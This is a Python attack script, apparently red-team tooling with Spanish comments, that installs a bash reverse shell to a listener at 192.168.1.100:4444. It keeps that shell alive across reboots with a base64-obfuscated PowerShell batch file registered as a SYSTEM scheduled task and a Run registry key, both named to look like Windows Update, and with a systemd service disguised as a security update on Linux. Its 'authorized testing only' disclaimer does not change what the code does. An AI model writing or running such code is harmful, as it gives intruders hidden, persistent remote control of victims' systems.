import os
import platform
import subprocess
import base64

# ðŸ“¢ Â¡Derechos Reservados ART (Argentina Red Team)! ðŸ“¢ 
# Solo para pruebas en entornos autorizados, Â¡no te mandes macanas!

def create_payload():
    """
    Â¡Genera el famoso shell inverso! 
    """
    # Â¡IP y puerto de tu escucha! (Â¡CÃ¡mbialos!)
    LHOST = "192.168.1.100" 
    LPORT = "4444"

    # Â¡Payload ninja en Bash! (Â¡CÃ¡mbialo si querÃ©s otro shell!)
    payload = f'''
bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'
'''

    # Â¡Lo guardamos en un archivo temporal!
    with open('/tmp/payload.sh', 'w') as f:
        f.write(payload)
    # Â¡Le damos permiso de ejecuciÃ³n!
    os.chmod('/tmp/payload.sh', 0o755)

def windows_persistence():
    """
    Â¡Nos quedamos en Windows aunque reinicies! ðŸ˜ˆ
    """
    # Â¡Ruta completa al script batch que va a correr nuestro payload!
    payload_path = os.path.abspath('payload.bat')

    # Â¡Creamos el script batch con el payload en PowerShell! (Â¡MÃ¡s sigiloso!)
    encoded_payload = base64.b64encode(f'''
powershell -w hidden -noni -nop -c "while(1){{Start-Sleep -Seconds 10;Try{{bash -i >& /dev/tcp/192.168.1.100/4444 0>&1}}Catch{{}}}}
'''.encode()).decode()  # CodificaciÃ³n en Base64 para ofuscaciÃ³n

    with open(payload_path, 'w') as f:
        f.write(f'@echo off\npowershell -EncodedCommand {encoded_payload}')

    # Â¡Tarea programada que se ejecuta al iniciar sesiÃ³n! (Â¡Como un fantasma!)
    subprocess.run(['schtasks', '/create', '/tn', 'WindowsUpdateCheck', '/tr', payload_path, '/sc', 'onlogon', '/ru', 'SYSTEM'], shell=True)

    # Â¡Entrada en el registro para que se ejecute siempre! (Â¡Imposible de borrar!)
    subprocess.run(['reg', 'add', 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'WindowsUpdate', '/t', 'REG_SZ', '/d', payload_path, '/f'], shell=True)

def linux_persistence():
    """
    Â¡Nos hacemos dueÃ±os de Linux y no nos vamos mÃ¡s! ðŸ˜ˆ
    """
    # Â¡Creamos el payload en un archivo temporal!
    create_payload()

    # Â¡Creamos un servicio de systemd que siempre lo ejecuta! (Â¡MÃ¡s ninja!)
    systemd_service = f'''[Unit]
Description=Servicio de ActualizaciÃ³n de Seguridad

[Service]
Type=simple
ExecStart=/bin/bash /tmp/payload.sh

[Install]
WantedBy=multi-user.target
'''

    # Â¡Guardamos el servicio en systemd!
    with open('/etc/systemd/system/update-service.service', 'w') as f:
        f.write(systemd_service)

    # Â¡Lo habilitamos y lo ejecutamos! (Â¡Chan!)
    subprocess.run(['systemctl', 'enable', 'update-service.service'], shell=True)
    subprocess.run(['systemctl', 'start', 'update-service.service'], shell=True)

def main():
    """
    Â¡AcciÃ³n! Detectamos el sistema operativo y aplicamos la persistencia.
    """
    system = platform.system().lower()
    if 'windows' in system:
        windows_persistence()
        print("Â¡Persistencia en Windows lista! ðŸ˜Ž")
    elif 'linux' in system:
        linux_persistence()
        print("Â¡Persistencia en Linux lista! ðŸ˜Ž")
    else:
        print(f"Sistema operativo no soportado: {system} ðŸ˜”")

if __name__ == "__main__":
    main()
